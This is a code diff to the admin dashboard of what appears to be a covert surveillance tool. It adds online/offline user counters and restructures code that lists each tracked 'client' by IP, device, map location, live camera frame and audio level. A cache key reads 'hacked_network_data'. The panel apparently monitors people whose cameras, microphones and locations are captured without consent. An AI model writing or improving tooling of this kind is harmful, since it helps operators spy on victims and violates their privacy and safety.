@@ -29,6 +29,10 @@
         .badge{ background:#2a3a50; padding:2px 12px; border-radius:20px; font-size:12px; margin-left:10px; }
         .offline-badge{ background:#ff6b6b33; color:#ff6b6b; }
         .timestamp{ font-size:11px; color:#445; margin-top:5px; }
+        .status-summary{ background:#1a2430; padding:12px 20px; border-radius:10px; margin-bottom:20px; display:flex; gap:30px; flex-wrap:wrap; }
+        .status-summary span{ display:flex; align-items:center; gap:8px; }
+        .online-dot{ display:inline-block; width:12px; height:12px; border-radius:50%; background:#00ff88; }
+        .offline-dot{ display:inline-block; width:12px; height:12px; border-radius:50%; background:#ff6b6b; }
     </style>
 </head>
 <body>
@@ -39,9 +43,13 @@
         <a href="/random/admin/logout" class="logout">Logout</a>
     </div>
 </div>
+<div class="status-summary">
+    <span><span class="online-dot"></span> Online: <span id="onlineCount">0</span></span>
+    <span><span class="offline-dot"></span> Offline: <span id="offlineCount">0</span></span>
+    <span>📊 Total Users: <span id="totalCount">0</span></span>
+</div>
 <div id="clientsGrid" class="client-grid"></div>
 <script>
-    // এডমিন হিসেবে কানেক্ট (কুয়েরি প্যারামিটার)
     const socket = io({ query: { admin: 'true' } });
     const CACHE_KEY = 'hacked_network_data';
 
@@ -52,28 +60,19 @@
         localStorage.setItem(CACHE_KEY, JSON.stringify(data));
     }
 
-    // মার্জ + রেন্ডার
-    function mergeAndRender(liveData) {
-        const cache = loadCache();
-        // লাইভ ডেটা দিয়ে আপডেট করো
-        for (const [ip, data] of Object.entries(liveData)) {
-            cache[ip] = data;
-            cache[ip].offline = false;
-        }
-        // যারা লাইভে নেই তাদের offline flag true
-        for (const [ip, data] of Object.entries(cache)) {
-            if (!liveData[ip]) {
-                data.offline = true;
-            }
-        }
-        saveCache(cache);
-        render(cache);
-    }
-
     function render(clientsData) {
         const grid = document.getElementById('clientsGrid');
         grid.innerHTML = '';
         const keys = Object.keys(clientsData);
+        let online = 0, offline = 0;
+        for (const [ip, data] of Object.entries(clientsData)) {
+            if (data.offline) offline++;
+            else online++;
+        }
+        document.getElementById('onlineCount').textContent = online;
+        document.getElementById('offlineCount').textContent = offline;
+        document.getElementById('totalCount').textContent = keys.length;
+
         if (keys.length === 0) {
             grid.innerHTML = '<div style="padding:40px;text-align:center;color:#556;">No data available</div>';
             return;
@@ -90,12 +89,12 @@
                 videoHtml = `<img src="${data.last_frame}" alt="Video" />`;
             }
             const vol = data.audio_level || 0;
-            const offline = data.offline ? true : false;
+            const offlineFlag = data.offline ? true : false;
             card.innerHTML = `
                 <div class="client-id">
                     🆔 ${data.id || data.ip}
                     <span class="badge">${data.sids ? data.sids.length : 0} connection(s)</span>
-                    ${offline ? '<span class="badge offline-badge">📴 Offline</span>' : '<span class="badge" style="background:#00ff8844;color:#00ff88;">● Live</span>'}
+                    ${offlineFlag ? '<span class="badge offline-badge">📴 Offline</span>' : '<span class="badge" style="background:#00ff8844;color:#00ff88;">● Live</span>'}
                 </div>
                 <div class="client-info">🌐 IP: ${data.ip}</div>
                 <div class="client-info">📱 Device: ${data.user_agent || 'Unknown'}</div>
@@ -105,7 +104,7 @@
                     <div style="flex:1;">${mapHtml}</div>
                     <div class="video-container">${videoHtml}</div>
                 </div>
-                <div class="timestamp">${offline ? '📴 Last seen before disconnect' : '🟢 Live'}</div>
+                <div class="timestamp">${offlineFlag ? '📴 Last seen before disconnect' : '🟢 Live'}</div>
             `;
             grid.appendChild(card);
             if (data.location) {
@@ -119,18 +118,26 @@
         }
     }
 
-    // লাইভ আপডেট আসলে মার্জ করো
     socket.on('admin_update', (liveData) => {
-        mergeAndRender(liveData);
+        const cache = loadCache();
+        for (const [ip, data] of Object.entries(liveData)) {
+            cache[ip] = data;
+            cache[ip].offline = false;
+        }
+        for (const [ip, data] of Object.entries(cache)) {
+            if (!liveData[ip]) {
+                data.offline = true;
+            }
+        }
+        saveCache(cache);
+        render(cache);
     });
 
-    // প্রথমবার ক্যাশে দেখাও
     window.addEventListener('load', () => {
         const cached = loadCache();
         if (Object.keys(cached).length > 0) render(cached);
     });
 
-    // Clear Button
     document.getElementById('clearBtn').addEventListener('click', () => {
         const pass = prompt('Enter clear password:');
         if (pass === null) return;
@@ -145,7 +152,6 @@
         });
     });
 
-    // অন্য ট্যাব থেকে ক্লিয়ার করলে এখানেও ক্লিয়ার হবে
     socket.on('clear_all', () => {
         localStorage.removeItem(CACHE_KEY);
         render({});
